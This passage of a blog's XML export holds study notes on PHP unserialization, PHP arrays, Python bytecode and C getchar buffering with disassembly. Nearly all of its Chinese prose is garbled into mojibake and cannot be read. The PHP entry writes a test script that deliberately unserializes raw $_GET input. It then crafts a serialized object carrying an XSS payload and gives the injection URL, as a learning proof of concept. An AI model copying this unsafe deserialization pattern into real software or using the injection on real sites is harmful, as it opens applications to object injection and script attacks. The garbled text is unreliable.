    <url>%2F2019%2F07%2F30%2Fphp%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[php ÂèçÂ∫èÂàóÂåñ ÂÖàÁúã‰∏Ä‰∏™Ê†óÂ≠êÔºö 12345678910&lt;?phpclass Test&#123; public $name = "pxy"; private $sex = "secret"; protected $age = "20";&#125;$test1 = new Test();$object = serialize($test1);print_r($object); Â∫èÂàóÂåñ‰πãÂêéÂæóÂà∞ÁöÑÁªìÊûúÊòØÔºö O:4:&quot;Test&quot;:3:{s:4:&quot;name&quot;;s:3:&quot;pxy&quot;;s:9:&quot;Testsex&quot;;s:6:&quot;secret&quot;;s:6:&quot;*age&quot;;s:2:&quot;20&quot;;} O‰ª£Ë°®ÊòØÂØπË±°ÔºåTestÊòØÁ±ªÂêçÔºå‰πãÂêéÊòØÂ±ûÊÄßÔºå‰∏çÂêåÁ±ªÂûãÁöÑÂ±ûÊÄßÂÖ∂ÂÆûÂ∫èÂàóÂåñ‰πãÂêéÂæóÂà∞ÁöÑÁªìÊûúÊòØ‰∏ç‰∏ÄÊ†∑ÁöÑ„ÄÇ ÁúãÂÆòÊñπÊñáÊ°£ÔºåËß£Èáä‰∫Ü‰∏∫‰ªÄ‰πàÈúÄË¶ÅÂ∫èÂàóÂåñËøôÁßçÊìç‰ΩúÔºö serialize() ËøîÂõûÂ≠óÁ¨¶‰∏≤ÔºåÊ≠§Â≠óÁ¨¶‰∏≤ÂåÖÂê´‰∫ÜË°®Á§∫ value ÁöÑÂ≠óËäÇÊµÅÔºåÂèØ‰ª•Â≠òÂÇ®‰∫é‰ªª‰ΩïÂú∞Êñπ„ÄÇ ËøôÊúâÂà©‰∫éÂ≠òÂÇ®Êàñ‰º†ÈÄí PHP ÁöÑÂÄºÔºåÂêåÊó∂‰∏ç‰∏¢Â§±ÂÖ∂Á±ªÂûãÂíåÁªìÊûÑ„ÄÇ ÂêåÊó∂ÊèêÂà∞‰∫Ü‰∏Ä‰∏™È≠îÊúØÊñπÊ≥ïÔºö ÂΩìÂ∫èÂàóÂåñÂØπË±°Êó∂ÔºåPHP Â∞ÜËØïÂõæÂú®Â∫èÂàóÂä®‰Ωú‰πãÂâçË∞ÉÁî®ËØ•ÂØπË±°ÁöÑÊàêÂëòÂáΩÊï∞ __sleep()„ÄÇËøôÊ†∑Â∞±ÂÖÅËÆ∏ÂØπË±°Âú®Ë¢´Â∫èÂàóÂåñ‰πãÂâçÂÅö‰ªª‰ΩïÊ∏ÖÈô§Êìç‰Ωú„ÄÇÁ±ª‰ººÁöÑÔºåÂΩì‰ΩøÁî® unserialize() ÊÅ¢Â§çÂØπË±°Êó∂Ôºå Â∞ÜË∞ÉÁî® __wakeup() ÊàêÂëòÂáΩÊï∞„ÄÇ __sleep()Âíå__wakeup()‰∏§‰∏™ÊñπÊ≥ïÂæàÂΩ¢Ë±°Âú∞ËØ¥Êòé‰∫Ü‰ªÄ‰πàÊó∂ÂÄôË∞ÉÁî®„ÄÇ ÁÑ∂ÂêéÊàëÂ∞±ÁäØ‰∫Ü‰∏Ä‰∏™Êñ∞ÊâãÂæàÂ∏∏ËßÅÁöÑÈîôËØØÔºö __sleep()ÊñπÊ≥ïÂøÖÈ°ªÊòØË¶ÅËøîÂõû‰∏Ä‰∏™arrayÂú∞ ÂéüÊù•„ÄÇ„ÄÇ__sleep()ÊñπÊ≥ïÊòØËøôÊ†∑Â≠êË∞ÉÁî®ÁöÑÂïä 123456789&lt;?phpclass Test&#123; public $name = "pxy"; private $sex = "secret"; protected $age = "20"; function __sleep()&#123; return array('name', 'sex', 'age'); &#125;&#125; ÂÆûÈôÖËøΩË∏™‰∏Ä‰∏ã‰∏∫‰ªÄ‰πà‰ºöÂá∫Áé∞ÂèçÂ∫èÂàóÂåñ Ë∞ÉËØï‰ª£Á†ÅÂ¶Ç‰∏ã: 12345678910&lt;?phpclass test&#123; public $target = "this is a test"; function __destruct()&#123; echo $this-&gt;target; &#125;&#125;$a = $_GET['b'];$c = unserialize($a); Âà©Áî®ÊÄùË∑ØÔºö‰º†ÂÖ•ÁöÑÂèÇÊï∞ÊòØÂèØÊéßÁöÑÔºåÂπ∂‰∏îËøôÈáåËøòÊúâ‰∏Ä‰∏™testÁ±ªÂíå‰∏Ä‰∏™__destruct()È≠îÊúØÊñπÊ≥ï„ÄÇ ÈÇ£Â∞±ÊòØÊûÑÈÄ†Ëøô‰∏™ÂØπË±°Â∞ÜÂÖ∂Â∫èÂàóÂåñ‰πãÂêé‰º†ÂÖ•Ôºå‰πãÂêé‰ºöËá™Âä®ÂèçÂ∫èÂàóÂåñÂêåÊó∂Âú®ÂØπË±°ÈîÄÊØÅÁöÑÊó∂ÂÄôÂ∞±‰ºöËá™Âä®ÊâßË°åÈ≠îÊúØÊñπÊ≥ï‰∫Ü Êàë‰ª¨ËøôÊ†∑Êù•ÂÜôÔºö 1234567&lt;?class test&#123; public $target = "&lt;script&gt;alert('xss');&lt;/script&gt;";&#125;$object = new test();print_r(serialize($object)); Á™ÅÁÑ∂ËßâÂæóÂ∫èÂàóÂåñ‰πüÊúâ‰∏ÄÁÇπÂèòÈáèË¶ÜÁõñÁöÑÂë≥ÈÅìÔºåÊàëÂú®Â§ñÈÉ®ÊûÑÈÄ†ÁöÑÁ±ªÂÆû‰æãÂåñÁöÑÂØπË±°ËøõÂÖ•‰ª£Á†Å‰πãÂêéË¶ÜÁõñ‰∫ÜÂéüÊù•ÁöÑÂØπË±°Ôºü Ë∞ÉËØïËøáÁ®ãÂ¶Ç‰∏ãÔºö ÁîüÊàêÁöÑÂ∫èÂàóÂåñÂ≠óÁ¨¶‰∏≤Â¶Ç‰∏ãÔºö O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;} ÁÑ∂ÂêéÂ∞ÜÂÖ∂‰Ωú‰∏∫ÂèÇÊï∞‰º†ÂÖ•ËøõÂéª: http://localhost/test/testUnserialize0.php?b=O:4:%22test%22:1:{s:6:%22target%22;s:30:%22%3Cscript%3Ealert%28%27xss%27%29;%3C/script%3E%22;} Ê≠§Êó∂Êé•Êî∂Âà∞‰∫ÜÂèÇÊï∞Ôºö $aÁöÑÂÄº‰∏∫Ôºö&quot;O:4:&quot;test&quot;:1:{s:6:&quot;target&quot;;s:30:&quot;&lt;script&gt;alert('xss');&lt;/script&gt;&quot;;}&quot; ÁªßÁª≠ÂçïÊ≠•Ê≠•ÂÖ•Ôºö Ëøô‰∏™Êó∂ÂÄôÂ∞±‰ºöÂéªË∞ÉÁî®È≠îÊúØÊñπÊ≥ï‰∫Ü xssÊ°ÜÊ°ÜÂ∞±ÂºπÂá∫Êù•Âï¶„ÄÇ Êé•‰∏ãÊù•ÁªßÁª≠Á†îÁ©∂Ââ©‰∏ãÁöÑÈ≠îÊúØÊñπÊ≥ïÔºöÂÖàÁúãÂá†‰∏™ÁÆÄÂçïÁöÑ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859&lt;?phpclass test&#123; public $name = 'P2hm1n'; function __construct()&#123; echo "__construct()\n"; &#125; function __destruct()&#123; echo "__destruct()\n"; &#125; function __wakeup()&#123; echo "__wakeup()\n"; &#125; function __toString()&#123; return "__toString()"."\n"; &#125; function __sleep()&#123; echo "__sleep()\n"; return array("name"); &#125; function __call($funName, $argument)&#123; echo "Ë∞ÉÁî®ÊñπÊ≥ï".$funName."(:"."ÂèÇÊï∞:"; print_r($argument); echo "‰∏çÂ≠òÂú®ÔºÅ\n"; &#125; public static function __callStatic($funName, $argument)&#123; echo "Ë∞ÉÁî®ÈùôÊÄÅÊñπÊ≥ï".$funName."(:"."ÂèÇÊï∞:"; print_r($argument); echo "‰∏çÂ≠òÂú®ÔºÅ\n"; &#125;&#125;$test1 = new test();test::hello("nihao"); //‰∏çÂÆû‰æãÂåñÂØπË±°ÔºåÊ≠§Êó∂Ë∞ÉÁî®ÁöÑÊòØÈùôÊÄÅÊñπÊ≥ï$test1-&gt;hello("nihao"); //ÂÆû‰æãÂåñÂØπË±°$test2 = serialize($test1);$test3 = unserialize($test2);print($test3); ËæìÂá∫ÁöÑÁªìÊûúÂ¶Ç‰∏ãÔºö 123456789101112131415Ë∞ÉÁî®ÈùôÊÄÅÊñπÊ≥ïhello(:ÂèÇÊï∞:Array( [0] =&gt; nihao)‰∏çÂ≠òÂú®ÔºÅË∞ÉÁî®ÊñπÊ≥ïhello(:ÂèÇÊï∞:Array( [0] =&gt; nihao)‰∏çÂ≠òÂú®ÔºÅ__sleep()__wakeup()__toString()__destruct()__destruct() ËøôÂá†‰∏™ÊñπÊ≥ïÈÉΩËøòÊå∫Â•ΩÂå∫ÂàÜÁöÑÔºåÊØîËæÉÈöæÂå∫ÂàÜÁöÑÂ∞±ÊòØ__call()Âíå__callStatic()ÊñπÊ≥ï‰∫Ü„ÄÇ TODO ÂçÅÂÖ≠‰∏™È≠îÊúØÊñπÊ≥ïËØ¶Ëß£]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php-manual-note-0]]></title>
    <url>%2F2019%2F07%2F30%2Fphp-manual-note-0%2F</url>
    <content type="text"><![CDATA[php docÈòÖËØªÁ¨îËÆ∞0 array Êï∞ÁªÑÊòØphpÁöÑkey=&gt;valueÊò†Â∞Ñ keyÂè™ËÉΩÊòØintegerÂíåstringÁ±ªÂûãÔºåvalueÂèØ‰ª•ÊòØ‰ªªÊÑèÁ±ªÂûã ÊâÄ‰ª•key‰ºöÊúâÂ¶Ç‰∏ãÂº∫Âà∂ËΩ¨Êç¢Ôºö ÂåÖÂê´ÊúâÂêàÊ≥ïÊï¥ÂûãÂÄºÁöÑÂ≠óÁ¨¶‰∏≤‰ºöË¢´ËΩ¨Êç¢‰∏∫Êï¥Âûã„ÄÇ‰æãÂ¶ÇÈîÆÂêç &quot;8&quot; ÂÆûÈôÖ‰ºöË¢´ÂÇ®Â≠ò‰∏∫ 8„ÄÇ‰ΩÜÊòØ &quot;08&quot; Âàô‰∏ç‰ºöÂº∫Âà∂ËΩ¨Êç¢ÔºåÂõ†‰∏∫ÂÖ∂‰∏çÊòØ‰∏Ä‰∏™ÂêàÊ≥ïÁöÑÂçÅËøõÂà∂Êï∞ÂÄº„ÄÇ ÊµÆÁÇπÊï∞‰πü‰ºöË¢´ËΩ¨Êç¢‰∏∫Êï¥ÂûãÔºåÊÑèÂë≥ÁùÄÂÖ∂Â∞èÊï∞ÈÉ®ÂàÜ‰ºöË¢´ËàçÂéª„ÄÇ‰æãÂ¶ÇÈîÆÂêç 8.7 ÂÆûÈôÖ‰ºöË¢´ÂÇ®Â≠ò‰∏∫ 8„ÄÇ Â∏ÉÂ∞îÂÄº‰πü‰ºöË¢´ËΩ¨Êç¢ÊàêÊï¥Âûã„ÄÇÂç≥ÈîÆÂêç true ÂÆûÈôÖ‰ºöË¢´ÂÇ®Â≠ò‰∏∫ 1 ËÄåÈîÆÂêç false ‰ºöË¢´ÂÇ®Â≠ò‰∏∫ 0„ÄÇ Null ‰ºöË¢´ËΩ¨Êç¢‰∏∫Á©∫Â≠óÁ¨¶‰∏≤ÔºåÂç≥ÈîÆÂêç null ÂÆûÈôÖ‰ºöË¢´ÂÇ®Â≠ò‰∏∫ &quot;&quot;„ÄÇ Êï∞ÁªÑÂíåÂØπË±°‰∏çËÉΩË¢´Áî®‰∏∫ÈîÆÂêç„ÄÇÂùöÊåÅËøô‰πàÂÅö‰ºöÂØºËá¥Ë≠¶ÂëäÔºöIllegal offset type„ÄÇ ÊØîÂ¶ÇÂÆòÊñπ‰∏æ‰æãÂ¶Ç‰∏ãÔºö 123456789&lt;?php$array = array( 1 =&gt; "a", "1" =&gt; "b", 1.5 =&gt; "c", true =&gt; "d",);var_dump($array); ËæìÂá∫Â¶Ç‰∏ãÔºö 1234array(1) &#123; [1] =&gt; string(1) &quot;d&quot;&#125; ‰ºöÂØºËá¥Êï∞ÁªÑÁöÑ‰∏ÄÈÉ®ÂàÜÂÄºË¢´Ë¶ÜÁõñÊéâ ‰∏ä‰æã‰∏≠ÊâÄÊúâÁöÑÈîÆÂêçÈÉΩË¢´Âº∫Âà∂ËΩ¨Êç¢‰∏∫ 1ÔºåÂàôÊØè‰∏Ä‰∏™Êñ∞ÂçïÂÖÉÈÉΩ‰ºöË¶ÜÁõñÂâç‰∏Ä‰∏™ÁöÑÂÄºÔºåÊúÄÂêéÂâ©‰∏ãÁöÑÂè™Êúâ‰∏Ä‰∏™ &quot;d&quot;„ÄÇ ÂêåÊó∂Ôºö key ‰∏∫ÂèØÈÄâÈ°π„ÄÇÂ¶ÇÊûúÊú™ÊåáÂÆöÔºåPHP Â∞ÜËá™Âä®‰ΩøÁî®‰πãÂâçÁî®ËøáÁöÑÊúÄÂ§ß integer ÈîÆÂêçÂä†‰∏ä 1 ‰Ωú‰∏∫Êñ∞ÁöÑÈîÆÂêç„ÄÇ ÈÇ£Â∞±‰ºöÊúâËøôÁßçÁªìÊûúÔºö 1234567$array = array( "a", "b",6 =&gt; "c", "d",);var_dump($array); ËæìÂá∫‰∏∫Ôºö 12345678910array(4) &#123; [0] =&gt; string(1) &quot;a&quot; [1] =&gt; string(1) &quot;b&quot; [6] =&gt; string(1) &quot;c&quot; [7] =&gt; string(1) &quot;d&quot;&#125; Á•ûÂ•áÁöÑËß£ÂºïÁî®ËØ≠Ê≥ï 12345678910111213&lt;?phpfunction getArray()&#123; return array(1,2,3,4);&#125;//Ëß£ÂºïÁî®ËØ≠Ê≥ï$a = getArray()[0];var_dump($a);list(, $secondelement) = getArray();var_dump($secondelement); ËæìÂá∫‰∏∫Ôºö 12int(1)int(2) listÂÆö‰πâ‰∏∫ÔºöÂ∞ÜÊï∞ÁªÑ‰∏≠ÁöÑÂÄºËµãÂÄºÁªôÂèòÈáè Áî®[]ÁöÑËØ≠Ê≥ï Â¶ÇÊûúÊúâ‰∏Ä‰∏™Êï∞ÁªÑ $arr = array(5 =&gt; 1, 12 =&gt; 2); ÈÇ£‰πà$arr[] = 56Áõ∏ÂΩì‰∫é$arr[13]=56 ‰ΩøÁî®unsetÂáΩÊï∞ÂèØ‰ª•ÂèñÊ∂àÈîÆÂÄºÂØπÊò†Â∞ÑÊØîÂ¶Çunset($arr[5]),ÊàñËÄÖÈîÄÊØÅ‰∏Ä‰∏™Êï∞ÁªÑunset($arr)]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>php</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonÊñáÊ°£ÈòÖËØªÁ¨îËÆ∞2]]></title>
    <url>%2F2019%2F07%2F30%2Fpython%E6%96%87%E6%A1%A3%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B02%2F</url>
    <content type="text"><![CDATA[fluent python reading notes ÂàóË°®Êé®ÂØºÂºè ÊúÄÂ∏∏ËßÅÁöÑ‰∏ÄÁßçÂÜôÊ≥ï 123symboles = 'ABC%^&amp;*#@$'beyond_ascii = [ord(s) for s in symboles if ord(s) &gt; 40]print(beyond_ascii) ‰ΩÜÊòØ‰πüÂèØ‰ª•ÂêåÊó∂Áî®filterÂíåmapÂáΩÊï∞Êù•ÂÆûÁé∞ 12beyond_ascii = list(filter(lambda x: x &gt; 40, map(ord, symboles)))print(beyond_ascii) mapÂáΩÊï∞Â∞Ü‰∏Ä‰∏™ÂáΩÊï∞‰ΩúÁî®‰∫élist‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÂÄº‰∏äÔºåfilter‰πüÊòØÂØπÊï∞ÁªÑ‰∏≠ÁöÑÊØè‰∏Ä‰∏™ÂÄº‰ΩúÁî®‰∏Ä‰∏™ÂáΩÊï∞Ôºå‰ΩÜÊòØÂè™ËøîÂõû‰∏∫ÁúüÁöÑÊï∞ÂÄºÔºåpython3‰∏≠ÊúÄÂêéËøîÂõûÁöÑÊòØ‰∏Ä‰∏™filterÂØπË±° ÊØîÂ¶ÇËøáÊª§ÂàóË°®‰∏≠ÁöÑÊâÄÊúâÂ•áÊï∞ 1234# ËøáÊª§Âá∫ÂàóË°®‰∏≠ÁöÑÊâÄÊúâÂ•áÊï∞a = [1,242,45,23,536,1,325,63635,56335]a_is_odd = list(filter(lambda x: x % 2 != 0, a))print(a_is_odd) ÂÜçÊØîÂ¶ÇËøáÊª§Âá∫1~100‰∏≠Âπ≥ÊñπÊ†πÊòØÊï¥Êï∞ÁöÑÊï∞Â≠ó ÊâÄË∞ìÊï¥Êï∞Â∞±ÊòØËÉΩÊï¥Èô§1ÁöÑÊï∞Â≠ó 1234#ËøáÊª§Âá∫1~100‰∏≠Âπ≥ÊñπÊ†πÊòØÊï¥Êï∞ÁöÑÊï∞import mathg_is = list(filter(lambda x: math.sqrt(x) % 1 == 0, range(1, 101)))print(g_is) Ëß£ÂåÖ Â¶Ç‰∏ãÊòØ‰∏Ä‰∏™ÊØîËæÉÁ•ûÂ•áÁöÑÊ†óÂ≠êÔºå 123456# pythonËß£ÂåÖcolors = ['black', 'white']sizes = ['S', 'M', 'L']for tshirt in ('%s %s' % (c, s) for c in colors for s in sizes): print(tshirt) ËøôÈáåÁî®‰∏Ä‰∏™%Â∞ÜÂÖÉÁªÑËøõË°å‰∫ÜÊãÜÂåÖ Â¶Ç‰ΩïÂæàÂ•ΩÂú∞ÁêÜËß£ÂàóË°®Êé®ÂØºÂºèÂë¢Ôºü ‰Ω†ÂèØ‰ª•Â∞ÜÂÖ∂ÊÉ≥Ë±°‰∏∫‰∏Ä‰∏™ÂáΩÊï∞Ôºåfor c in colors for s in sizes ËøîÂõûÂÄºÊòØ(c, s) Áî®‰∏Ä‰∏™%ÊàêÂäüÂú∞ÂØπÂÖ∂ËøõË°å‰∫ÜÊãÜÂåÖËΩ¨Âåñ‰∏∫Â≠óÁ¨¶‰∏≤ÂΩ¢Âºè ‰∏ãÈù¢ËøôÂπÖÂõæÂ∫îËØ•ÊØîËæÉÂ•ΩÁêÜËß£ ÁÑ∂ÂêéÂ∞±Êúâ‰∫ÜËøîÂõûÂÄº ÂΩìÁÑ∂ËøòÊúâËøôÁßçÂÜôÊ≥ïÔºö 1a, b, *rst = range(5) Èô∑Èò± 123t = (1,2, [30, 40])t[2] += [50, 60]print(t) Âú®‰∏Ä‰∏™‰∏çÂèØÂèòÂØπË±°‰∏≠ÊèíÂÖ•‰∫ÜÂèØÂèòÂØπË±°ÔºÅ ËôΩÁÑ∂Êä•Èîô‰ΩÜÊòØtÁöÑÂÄºÁ°ÆÂÆûË¢´‰øÆÊîπ‰∫Ü ÂØπÂÖ∂ËøõË°åÂèçÊ±áÁºñÊàñËÄÖÊòØÂèçÁºñËØëÔºö ÂæóÂà∞Ôºö 1234567891011121314151617183 0 LOAD_CONST 1 (1) 3 LOAD_CONST 2 (2) 6 LOAD_CONST 3 (30) 9 LOAD_CONST 4 (40) 12 BUILD_LIST 2 15 BUILD_TUPLE 3 18 STORE_FAST 0 (t) 4 21 LOAD_FAST 0 (t) 24 LOAD_CONST 2 (2) 27 DUP_TOP_TWO 28 BINARY_SUBSCR 29 LOAD_CONST 5 (50) 32 LOAD_CONST 6 (60) 35 BUILD_LIST 2 38 INPLACE_ADD 39 ROT_THREE 40 STORE_SUBSCR ‰ΩúËÄÖÊèêÂá∫ÁöÑ‰∏â‰∏™ÊïôËÆ≠Ôºö ‰∏çË¶ÅÊääÂèØÂèòÂØπË±°ÊîæÂú®ÂÖÉÁªÑÈáåÈù¢ Â¢ûÈáèËµãÂÄº‰∏çÊòØ‰∏Ä‰∏™ÂéüÂ≠êÊìç‰Ωú Êü•ÁúãpythonÁöÑÂ≠óËäÇÁ†ÅÂπ∂‰∏çÈöæÔºåËÄå‰∏î‰∫ÜËß£‰ª£Á†ÅËÉåÂêéÁöÑËøêË°åÊú∫Âà∂ÂæàÊúâÂ∏ÆÂä© ÁÑ∂ÂêéÊàë‰ª¨Â∞±Êù•Á†îÁ©∂pythonÁöÑÂ≠óËäÇÁ†Å pythonÂ≠óËäÇÁ†Å ÂèòÈáè LOAD_FAST‰∏ÄËà¨Âä†ËΩΩÂ±ÄÈÉ®ÂèòÈáèÁöÑÂÄºÔºå‰πüÂ∞±ÊòØËØªÂèñÂÄºÔºåÁî®‰∫éËÆ°ÁÆóÊàñËÄÖÂáΩÊï∞Ë∞ÉÁî®‰º†ÂèÇÁ≠â„ÄÇ STORE_FAST‰∏ÄËà¨Áî®‰∫é‰øùÂ≠òÂÄºÂà∞Â±ÄÈÉ®ÂèòÈáè„ÄÇ ÊØîÂ¶ÇÔºö 123461 77 LOAD_FAST 0 (n) 80 LOAD_FAST 3 (p) 83 INPLACE_DIVIDE 84 STORE_FAST 0 (n) INPLACE_DIVIDEÂ∞±ÊòØÂéüÂú∞Èô§Ê≥ïÔºåÂÖàÂä†ËΩΩnÔºåÁÑ∂ÂêéÂä†ËΩΩpÔºåÁÑ∂ÂêéÈô§Ê≥ïÔºåÁÑ∂Âêé‰øùÂ≠òÁªìÊûú ÂØπÂ∫îÁöÑÂ∞±ÊòØ n = n/p Â¶Ç‰ΩïÂå∫ÂàÜÂáΩÊï∞ÂΩ¢ÂèÇÂíåÂÖ∂‰ªñÁöÑÂ±ÄÈÉ®ÂèòÈáèÔºü ÂΩ¢ÂèÇÊ≤°ÊúâÂàùÂßãÂåñÔºå‰πüÂ∞±ÊòØ‰ªéÂáΩÊï∞ÂºÄÂßãÂà∞LOAD_FASTËØ•ÂèòÈáèÁöÑ‰ΩçÁΩÆÔºåÂ¶ÇÊûúÊ≤°ÊúâÁúãÂà∞STORE_FASTÔºåÈÇ£‰πàËØ•ÂèòÈáèÂ∞±ÊòØÂáΩÊï∞ÂΩ¢ÂèÇ„ÄÇ 123456789104 0 LOAD_CONST 1 (0) 3 STORE_FAST 1 (local1)5 6 LOAD_FAST 1 (local1) 9 PRINT_ITEM 10 LOAD_FAST 0 (arg1) 13 PRINT_ITEM 14 PRINT_NEWLINE 15 LOAD_CONST 0 (None) 18 RETURN_VALUE ËøôÈáåarg1Â∞±Ê≤°ÊúâSTORE_FAST ÊâÄ‰ª•ÂØπÂ∫îÁöÑÊ∫ê‰ª£Á†Å‰∏∫Ôºö 123def test(arg1): local1 = 0 print local1, arg1 ÂÖ®Â±ÄÂèòÈáè LOAD_GLOBALÁî®Êù•Âä†ËΩΩÂÖ®Â±ÄÂèòÈáèÔºåÂåÖÊã¨ÊåáÂÆöÂáΩÊï∞ÂêçÔºåÁ±ªÂêçÔºåÊ®°ÂùóÂêçÁ≠âÂÖ®Â±ÄÁ¨¶Âè∑„ÄÇ 12348 6 LOAD_CONST 2 (101) 9 STORE_GLOBAL 0 (global1) 20 LOAD_GLOBAL 0 (global1) 23 PRINT_ITEM ÂØπÂ∫îÁöÑpython‰ª£Á†ÅÔºö 1234def test(): global global1 global1 = 101 print global1 Â∏∏Áî®Êï∞ÊçÆÁ±ªÂûã BUILD_LISTÁî®‰∫éÂàõÂª∫‰∏Ä‰∏™listÁªìÊûÑ„ÄÇ Â¶ÇÊûúÊòØÁî®ÂàóË°®Êé®ÂØºÂºèÂë¢Ôºü BUILD_MAPÁî®‰∫éÂàõÂª∫‰∏Ä‰∏™Á©∫ÁöÑdict„ÄÇSTORE_MAPÁî®‰∫éÂàùÂßãÂåñdictÁöÑÂÜÖÂÆπ„ÄÇ 1234563 0 LOAD_CONST 1 ('a') 3 LOAD_CONST 2 ('1') 6 BUILD_MAP 1 9 STORE_FAST 0 (k) 12 LOAD_CONST 0 (None) 15 RETURN_VALUE ÂèÇËÄÉ Ê≠ªÁ£ïpythonÂ≠óËäÇÁ†Å-ÊâãÂ∑•ËøòÂéüpythonÊ∫êÁ†Å]]></content>
      <categories>
        <category>note</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>pythonÂ≠óËäÇÁ†Å</tag>
        <tag>tricks</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CËØ≠Ë®ÄÁºìÂÜ≤Âå∫]]></title>
    <url>%2F2019%2F07%2F30%2FC%E8%AF%AD%E8%A8%80%E7%BC%93%E5%86%B2%E5%8C%BA%2F</url>
    <content type="text"><![CDATA[Ë∞ÉËØï‰∏Ä‰∏ãcËØ≠Ë®ÄÁ®ãÂ∫è Ëá™ÊàëÊÑüËßâÂæà‰πÖÊ≤°ÂÜôCËØ≠Ë®Ä‰∫Ü getcharÂáΩÊï∞ 1234567 char a = getchar();printf("a is %c\n", a);char b = getchar();printf("b is %c\n", b);char c = getchar();printf("c is %c\n", c);return 0; getcharÂáΩÊï∞ÊòØ‰æùÊ¨°‰ªéÁºìÂÜ≤Âå∫‰∏≠ÂèñÂá∫Â≠óÁ¨¶Êù•Ôºå‰ºöÂèñËµ∞ÁöÑÔºÅÔºÅ 1234nihaoa is nb is ic is h Ëøô‰∏ÄË°å 12for (; scanf("%d", &amp;nums[i]) != 0 &amp;&amp; getchar() == ' '; ++i) nums = (int*)realloc(nums, sizeof(int) * (i + 1)); //Êï∞ÁªÑ‰∏∫ÈùûÈôçÂ∫èÊéíÂàó ËøôÈáå‰ºöË¶ÅÊ±ÇÁî®Êà∑ËæìÂÖ•Êï∞ÊçÆÔºåÁî®Êà∑ËæìÂÖ•ÁöÑÊï∞ÊçÆÂ∞±ÊòØ‰ºöÂ≠òÊîæÂú®ÁºìÂÜ≤Âå∫ÂÜÖÔºåÁÑ∂Âêé‰πãÂêéscanfÊØèÊ¨°ËØª‰∏Ä‰∏™Êï∞Â≠óÔºågetcharÁ¥ßÈöèÂÖ∂ÂêéËØª‰∏Ä‰∏™Â≠óÁ¨¶ÔºåÊâÄ‰ª•Êàë‰ª¨ËæìÂÖ•ÁöÑÊó∂ÂÄôÂøÖÈ°ªÊòØ‰∏Ä‰∏™Êï∞Â≠ó‰∏Ä‰∏™Á©∫Ê†º 1while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;); ‰πãÂêéÊääÁºìÂÜ≤Âå∫ÁöÑÂ≠óÁ¨¶ËØªÂπ≤ÂáÄ ÊµãËØï‰∏Ä‰∏ãÔºåÂ¶ÇÊûúÊàëËæìÂÖ•12 21\n ÈÇ£‰πàscanfËØªÂÆå21‰πãÂêéÔºågetcharÂáΩÊï∞ËØª\n 123456700D52466 je main+0DEh (0D524AEh) 00D52468 mov esi,esp 00D5246A call dword ptr [__imp__getchar (0D5F220h)] ;ÂáΩÊï∞ËøîÂõûÂÄºÂ≠òÊîæÂú®eax‰∏≠ÔºåÂçÅËøõÂà∂10Ôºå‰ª£Ë°®LF00D52470 cmp esi,esp 00D52472 call __RTC_CheckEsp (0D51357h) 00D52477 cmp eax,20h 00D5247A jne main+0DEh (0D524AEh) ÂÖ≥ÈîÆÊòØËøô‰∏§Êù°Êåá‰ª§Ôºö 1200D52472 call __RTC_CheckEsp (0D51357h) 00D52477 cmp eax,20h ÊâÄ‰ª•‰πãÂêéÊØîËæÉcmp eax 20hÂ∞±‰ºöË∑≥Âá∫Âæ™ÁéØ ‰πãÂêéËøõÂÖ•ÈÇ£‰∏™whileÂæ™ÁéØ 1234567while (getchar() == &apos;\n&apos; || getchar() == EOF || getchar() == &apos;\0&apos;);00D524AE mov esi,esp 00D524B0 call dword ptr [__imp__getchar (0D5F220h)] 00D524B6 cmp esi,esp 00D524B8 call __RTC_CheckEsp (0D51357h) 00D524BD cmp eax,0Ah 00D524C0 je main+119h (0D524E9h) Ê≠§Êó∂ÁºìÂÜ≤Âå∫Â∑≤ÁªèÊòØÁ©∫ÁöÑ‰∫ÜÔºåÊâÄ‰ª•‰ºöË¶ÅÊ±ÇÁî®Êà∑ÁªßÁª≠ËæìÂÖ•Êï∞ÊçÆ ÊàëÊ≠§Êó∂ËæìÂÖ•‰∫Ü 1\n ÊâÄ‰ª•Ë∞ÉÁî®ÂÆågetcharÂáΩÊï∞‰πãÂêéeaxÂ≠òÊîæ‰∫ÜÂçÅÂÖ≠ËøõÂà∂ÁöÑ49 ÈÇ£‰πàÁ¨¨‰∫å‰∏™Ë∞ÉÁî®getcharËØªÂèñÁöÑÁªìÊûúÂ∞±ÊòØ0Ah 1234500D524C2 mov esi,esp 00D524C4 call dword ptr [__imp__getchar (0D5F220h)] 00D524CA cmp esi,esp 00D524CC call __RTC_CheckEsp (0D51357h) 00D524D1 cmp eax,0FFFFFFFFh ÁªßÁª≠„ÄÇÊ≠§Êó∂ÁºìÂÜ≤Âå∫Â∑≤ÁªèÁ©∫‰∫Ü ÈÇ£‰πà‰ºöË¶ÅÊ±ÇÁî®Êà∑ÁªßÁª≠ËæìÂÖ• ÊàëÂèàËæìÂÖ•‰∫Ü‰∏Ä‰∏™Êç¢Ë°åÁ¨¶ÔºåÂæàÊòéÊòæÊ≠§Êó∂ËØªÂèñÁöÑÁªìÊûúÈùûÁ©∫ÔºåÊâÄ‰ª•Ë∑≥Âá∫whileÂæ™ÁéØ 12345600D524D8 call dword ptr [__imp__getchar (0D5F220h)] 00D524DE cmp esi,esp 00D524E0 call __RTC_CheckEsp (0D51357h) 00D524E5 test eax,eax ;Ê£ÄÊü•eaxÊòØÂê¶‰∏∫Á©∫00D524E7 jne main+11Bh (0D524EBh) 00D524E9 jmp main+0DEh (0D524AEh) ÈÅáÂà∞ÁöÑÂ∞¥Â∞¨ 